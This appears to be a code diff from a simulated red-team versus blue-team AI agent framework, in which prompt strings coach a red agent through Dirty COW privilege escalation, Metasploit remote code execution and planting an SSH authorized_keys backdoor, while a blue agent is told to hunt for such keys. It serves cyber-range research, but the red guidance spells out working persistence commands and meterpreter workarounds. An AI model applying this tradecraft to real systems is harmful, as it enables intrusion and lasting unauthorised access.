@@ -308,6 +308,16 @@ SUID binaries, writable cron jobs/scripts, readable config/secrets, or a kernel
 exploit (check `uname -r` — an old kernel may be vulnerable).
 
 KERNEL EXPLOIT — DIRTY COW (CVE-2016-5195):
+CAUTION — this is a LAST resort, not a default move, and it is DANGEROUS to the
+box. Dirty COW races the kernel; running it repeatedly, in the background, or with
+escalating million-iteration loops PANICS the kernel and takes the whole target
+offline — which forfeits your foothold and EVERY objective, persistence included.
+If you have any other path (an earned credential, an SSH-key plant for
+persistence, a service RCE, a SUID/sudo/group route), take it first. If you do
+reach for Dirty COW: exactly ONE short, time-capped attempt against a single
+sacrificial file — never a loop, never a backgrounded driver, never a second
+grinding run. If the target stops responding to commands, you have crashed it —
+stop immediately; it will not recover on its own.
 Before trying this, confirm it even applies: run `uname -r` and check whether the
 kernel is old enough (pre-4.8.3 / 4.7.9 / 4.6.18, e.g. a 3.x or early-4.x line) to
 be vulnerable to Dirty COW. Do NOT assume it's there — discover it from the box.
@@ -473,7 +483,12 @@ actually served from (`/`, `/drupal/`, whatever recon showed), never a hardcoded
 guess. `run -z` backgrounds the session the instant it opens instead of dropping
 you into an interactive meterpreter prompt your tool can't drive; the immediately
 following `sessions -i 1 -c id` runs one real command on that session and returns
-its output directly in the SAME call — no separate step needed.
+its output directly in the SAME call — no separate step needed. NOTE:
+`sessions -i <id> -c "<cmd>"` sends `<cmd>` to the METERPRETER CONSOLE itself,
+not a shell — it works here because `id` is a single program with no shell
+syntax. A compound command (`&&`, `$()`, `>>`) sent the same way does NOT run
+as bash and silently writes nothing; see the persistence doctrine below for
+how to run a real multi-step shell recipe through this same session.
 
 THE RETURNED COMMAND OUTPUT IS THE PROOF: genuine `id` output (`uid=...(...)`)
 following `Running 'id' on meterpreter session...` IS your RCE proof. msf's
@@ -1610,15 +1625,46 @@ class RedAgent(Agent):
                 "the TARGET's authorized_keys, not a pubkey sitting on Kali:\n"
                 "1. On Kali (once): `ssh-keygen -t ed25519 -f /tmp/pl_key -N \"\"` "
                 "then `cat /tmp/pl_key.pub` to see the line.\n"
-                "2. ON THE TARGET, append that exact line to the authorized_keys of "
-                "an account you control — `/root/.ssh/authorized_keys` if you have "
-                "root, else your own account's `~/.ssh/authorized_keys`: "
-                "`mkdir -p ~/.ssh && echo 'ssh-ed25519 <your pl_key.pub line>' >> "
-                "~/.ssh/authorized_keys`.\n"
-                "3. ON THE TARGET, read it back: `cat ~/.ssh/authorized_keys` and "
-                "confirm the `ssh-ed25519` line is present. THAT target-side "
-                "readback is the win — `cat`-ing the pubkey on Kali is NOT. A "
-                "planted key survives a password lock."
+                "2. ON THE TARGET, resolve your account's REAL home and append "
+                "there. Do NOT write to a bare `~/.ssh` — a reverse/meterpreter/web "
+                "shell often does not expand `~`, so `mkdir -p ~/.ssh` makes a "
+                "folder literally named `~` under your cwd that sshd never reads "
+                "(a dead key). Resolve the home with getent and use the absolute "
+                "path:\n"
+                "`H=$(getent passwd \"$(id -un)\" | cut -d: -f6); mkdir -p "
+                "\"$H/.ssh\" && chmod 700 \"$H/.ssh\" && echo 'ssh-ed25519 <your "
+                "pl_key.pub line>' >> \"$H/.ssh/authorized_keys\" && chmod 600 "
+                "\"$H/.ssh/authorized_keys\"` (if you are root, `H=/root`).\n"
+                "HOW TO RUN STEP 2 (read this before you touch the target): if you "
+                "have `execute_command` (an earned SSH credential), run the recipe "
+                "there directly — it's a real shell, the command above works as-is, "
+                "skip to step 3. If your ONLY foothold is a meterpreter session "
+                "(web RCE, no SSH cred — `execute_command` is refused), you MUST "
+                "make THREE separate `run_on_attacker` calls, in order, and you are "
+                "NOT done with step 2 until the third one's output proves the "
+                "script ran. Do not go back to recon or hunting for the flag "
+                "between them:\n"
+                "  2a. Write the recipe to a local script on Kali: "
+                "`cat > /tmp/pl_plant.sh << 'EOF'` ... the recipe lines ... `EOF`.\n"
+                "  2b. A NEW msfconsole call that re-exploits and uploads the "
+                "script onto the target (the file lands on the TARGET's real "
+                "disk, so it survives even though the session itself does not): "
+                "`...; run -z; sessions -i 1 -c \"upload /tmp/pl_plant.sh "
+                "/tmp/pl_plant.sh\"; exit -y`.\n"
+                "  2c. ANOTHER new msfconsole call that re-exploits again and "
+                "RUNS the uploaded script through a REAL shell — this is the step "
+                "that actually writes the key, do not skip it: `...; run -z; "
+                "sessions -i 1 -c \"execute -f /bin/sh -a /tmp/pl_plant.sh -i -H\"; "
+                "exit -y`. Do NOT instead send the recipe text itself via "
+                "`sessions -i 1 -c \"<recipe>\"` — that feeds it to the meterpreter "
+                "CONSOLE, not bash, so `&&`/`$()`/`>>` are never interpreted and "
+                "nothing gets written; passing the script PATH to `-a` is what "
+                "makes this work.\n"
+                "3. ON THE TARGET, read it back: `cat \"$H/.ssh/authorized_keys\"` "
+                "and confirm the `ssh-ed25519` line is present at that absolute "
+                "home path. THAT readback is the win — a key under a literal `~` "
+                "folder, or `cat`-ing the pubkey on Kali, is NOT. A planted key "
+                "survives a password lock."
             )
         if self.phase == "flag_read":
             return f"Red Phase: {self.phase}. {self._flag_read_guidance()}"
@@ -1981,9 +2027,15 @@ class BlueAgent(Agent):
         # Keep sweeping every turn until a key surfaces (then EVICT, above, takes
         # over): a one-shot hunt blinds blue if it checks before red plants --
         # red plants on its own schedule, so an early clean sweep must not end
-        # the watch. Observe-gated to match HARDEN/foothold-hunt.
-        if (observe and self._has_foothold()
-                and not self._planted_key_account()):
+        # the watch. NOT observe-gated (unlike HARDEN): a planted key outlives an
+        # IP ban, so blue must hunt it in a live engagement too. The first move
+        # adapts to the foothold's nature: a service-context foothold (www-data
+        # web-RCE) has no account-escalation playbook and its durable threat IS
+        # the key, so hunt now; a real login account is one command from root, so
+        # run that playbook (revoke/confirm/contain) first and hunt once contained.
+        if (self._has_foothold()
+                and not self._planted_key_account()
+                and (not self._attacker_account() or contained)):
             return (
                 "Blue guidance: A foothold has landed. Before you settle into "
                 "documenting, check for a PLANTED BACKDOOR: call "
